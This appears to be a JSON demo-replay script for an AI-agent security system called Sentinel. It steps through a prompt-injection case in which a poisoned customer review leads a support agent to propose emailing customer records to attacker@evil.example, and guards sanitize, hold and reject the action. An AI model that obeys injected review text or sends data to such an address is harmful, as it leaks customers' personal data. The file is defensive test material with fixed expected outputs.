@@ -1,0 +1,206 @@
+{
+  "script_id": "demo-v1",
+  "name": "Sentinel 5-minute Demo Replay",
+  "steps": [
+    {
+      "id": "S1",
+      "title": "SupportBot is registered and BreachPath shows the route",
+      "actor": "alice",
+      "calls": [
+        {
+          "method": "GET",
+          "endpoint": "/api/v1/graph/routes?max_depth=4"
+        }
+      ],
+      "expected": {
+        "routes_count": 7,
+        "derived_badges": ["tool:browse_page", "tool:read_reviews"],
+        "highlight_route": "p_460263f0bbf3"
+      }
+    },
+    {
+      "id": "S2",
+      "title": "A poisoned review is waiting",
+      "actor": "alice",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/sessions",
+          "payload": {"agent_id": "supportbot"}
+        }
+      ],
+      "expected": {
+        "session_id": "sess_demo0001",
+        "taint_level": 0,
+        "taint_label": "clean",
+        "outbox_empty": true
+      }
+    },
+    {
+      "id": "S3",
+      "title": "PromptShield sanitizes the review and taints the session",
+      "actor": "alice",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/sandbox/load-review",
+          "payload": {"session_id": "sess_demo0001", "review_id": "rv-p2"}
+        }
+      ],
+      "expected": {
+        "outcome": "sanitize",
+        "rule_ids": ["PS-R-TOOL_OUTPUT-DIRECTIVE", "PS-R-TOOL_OUTPUT-EXFIL_TARGET"],
+        "decision_path": "rules+llm",
+        "findings": [
+          {"type": "directive", "confidence_pct": 100},
+          {"type": "exfil_target", "confidence_pct": 90}
+        ],
+        "text_for_model": "Love the fit and fast shipping! [removed by Sentinel: directive, exfil_target] Thanks again!",
+        "session_taint": 2,
+        "taint_label": "flagged"
+      }
+    },
+    {
+      "id": "S4",
+      "title": "The agent proposes the email anyway, ActionGate holds it",
+      "actor": "alice",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/agent/v1/actions",
+          "payload": {
+            "session_id": "sess_demo0001",
+            "action_type": "email.send",
+            "arguments": {
+              "to": ["attacker@evil.example"],
+              "subject": "Customer export",
+              "body": "Alice A,alice@x.example,120.50",
+              "resource": "svc:mailer"
+            }
+          }
+        }
+      ],
+      "expected": {
+        "outcome": "hold",
+        "rule_ids": ["AG-R-H01", "AG-R-H02", "AG-R-H05", "AG-R-H09"],
+        "decision_path": "rules+llm",
+        "approval_status": "pending",
+        "approval_id": "apr_000001"
+      }
+    },
+    {
+      "id": "S5",
+      "title": "Alice cannot approve her own request, Bob sees the truth and rejects",
+      "actor": "alice",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/approvals/apr_000001/decision",
+          "actor": "alice",
+          "payload": {"decision": "approve"},
+          "expect_status": 403
+        },
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/approvals/apr_000001/decision",
+          "actor": "bob",
+          "payload": {"decision": "reject", "comment": "Recipient is not an Acme address."},
+          "expect_status": 200
+        },
+        {
+          "method": "POST",
+          "endpoint": "/agent/v1/actions/act_000001/execute",
+          "payload": {
+            "action_type": "email.send",
+            "arguments": {
+              "to": ["attacker@evil.example"],
+              "subject": "Customer export",
+              "body": "Alice A,alice@x.example,120.50",
+              "resource": "svc:mailer"
+            }
+          },
+          "expect_status": 409
+        }
+      ],
+      "expected": {
+        "self_approval_code": "approval.self_approval",
+        "bob_approval_status": "rejected",
+        "execute_error_code": "approval.not_approved"
+      }
+    },
+    {
+      "id": "S6",
+      "title": "Admin removes the agent's read access with BreachPath",
+      "actor": "admin",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/graph/remediations/e-agent-read-customerdb/preview"
+        },
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/graph/remediations/e-agent-read-customerdb/apply",
+          "payload": {"expected_version": 2}
+        }
+      ],
+      "expected": {
+        "preview_removed": ["p_3f50b1ef2c19", "p_65cc13b03940"],
+        "preview_remaining_count": 5,
+        "new_routes_count": 0,
+        "graph_version": 3
+      }
+    },
+    {
+      "id": "S7",
+      "title": "Kill the LLM, the system still decides safely",
+      "actor": "admin",
+      "calls": [
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/llm/mode",
+          "payload": {"mode": "down"}
+        },
+        {
+          "method": "POST",
+          "endpoint": "/agent/v1/actions",
+          "payload": {
+            "session_id": "sess_demo0001",
+            "action_type": "db.read",
+            "arguments": {"resource": "asset:customer_db", "limit": 5}
+          }
+        }
+      ],
+      "expected": {
+        "llm_mode": "down",
+        "outcome": "hold",
+        "decision_path": "fallback",
+        "rule_ids": ["AG-R-H03", "AG-R-H05"]
+      }
+    },
+    {
+      "id": "S8",
+      "title": "Tamper with the ledger, verification names the row",
+      "actor": "admin",
+      "calls": [
+        {
+          "method": "GET",
+          "endpoint": "/api/v1/ledger/verify"
+        },
+        {
+          "method": "POST",
+          "endpoint": "/api/v1/demo/tamper",
+          "payload": {"field": "outcome", "value": "allow"}
+        },
+        {
+          "method": "GET",
+          "endpoint": "/api/v1/ledger/verify"
+        }
+      ],
+      "expected": {
+        "pre_verify_valid": true,
+        "post_verify_valid": false,
+        "post_verify_reason": "hash_mismatch"
+      }
+    }
+  ]
+}
